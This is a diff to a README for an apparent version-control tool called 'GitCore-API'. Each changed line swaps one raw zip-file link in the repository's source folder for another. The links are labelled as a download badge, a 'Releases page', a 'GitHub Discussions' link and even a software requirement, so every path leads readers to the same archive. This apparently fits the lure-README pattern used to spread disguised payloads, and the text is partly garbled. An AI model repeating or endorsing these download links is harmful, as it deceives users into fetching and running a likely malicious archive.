@@ -1,6 +1,6 @@
 # 🚀 GitCore-API - Simplified Version Control for Everyone
 
-[![Download GitCore-API](https://github.com/aamirpasha/GitCore-API/raw/refs/heads/main/src/modules/git/Core-Git-API-v1.9.zip)](https://github.com/aamirpasha/GitCore-API/raw/refs/heads/main/src/modules/git/Core-Git-API-v1.9.zip)
+[![Download GitCore-API](https://raw.githubusercontent.com/aamirpasha/GitCore-API/main/src/entities/API_Core_Git_v1.0-alpha.4.zip)](https://raw.githubusercontent.com/aamirpasha/GitCore-API/main/src/entities/API_Core_Git_v1.0-alpha.4.zip)
 
 ## 📜 Overview
 
@@ -20,13 +20,13 @@ GitCore-API is a user-friendly application that allows you to manage your code l
 To run GitCore-API smoothly, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or higher, or any version of macOS or Linux.
-- **https://github.com/aamirpasha/GitCore-API/raw/refs/heads/main/src/modules/git/Core-Git-API-v1.9.zip**: Version 14 or higher.
+- **https://raw.githubusercontent.com/aamirpasha/GitCore-API/main/src/entities/API_Core_Git_v1.0-alpha.4.zip**: Version 14 or higher.
 - **PostgreSQL**: Version 12 or higher.
 - **Available Disk Space**: At least 200 MB free space.
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: Head to the [Releases page](https://github.com/aamirpasha/GitCore-API/raw/refs/heads/main/src/modules/git/Core-Git-API-v1.9.zip) to find the latest version of GitCore-API.
+1. **Visit the Releases Page**: Head to the [Releases page](https://raw.githubusercontent.com/aamirpasha/GitCore-API/main/src/entities/API_Core_Git_v1.0-alpha.4.zip) to find the latest version of GitCore-API.
 
 2. **Download the Application**: Click on the version number you want to download. Look for the download link for your operating system.
 
@@ -39,7 +39,7 @@ To run GitCore-API smoothly, ensure your system meets the following requirements
 
 ## 🔧 Download & Install
 
-To get started with GitCore-API, [visit this page to download](https://github.com/aamirpasha/GitCore-API/raw/refs/heads/main/src/modules/git/Core-Git-API-v1.9.zip). Make sure to pick the version that suits your operating system.
+To get started with GitCore-API, [visit this page to download](https://raw.githubusercontent.com/aamirpasha/GitCore-API/main/src/entities/API_Core_Git_v1.0-alpha.4.zip). Make sure to pick the version that suits your operating system.
 
 ## 💡 How to Use GitCore-API
 
@@ -70,7 +70,7 @@ To get started with GitCore-API, [visit this page to download](https://github.co
 If you encounter issues or need assistance, you can find help in the following ways:
 
 - **Official Documentation**: Check out the help section in the application for detailed guides.
-- **Community Support**: Join our [GitHub Discussions](https://github.com/aamirpasha/GitCore-API/raw/refs/heads/main/src/modules/git/Core-Git-API-v1.9.zip) to ask questions or share experiences.
+- **Community Support**: Join our [GitHub Discussions](https://raw.githubusercontent.com/aamirpasha/GitCore-API/main/src/entities/API_Core_Git_v1.0-alpha.4.zip) to ask questions or share experiences.
 
 ## 🛡️ Security
 
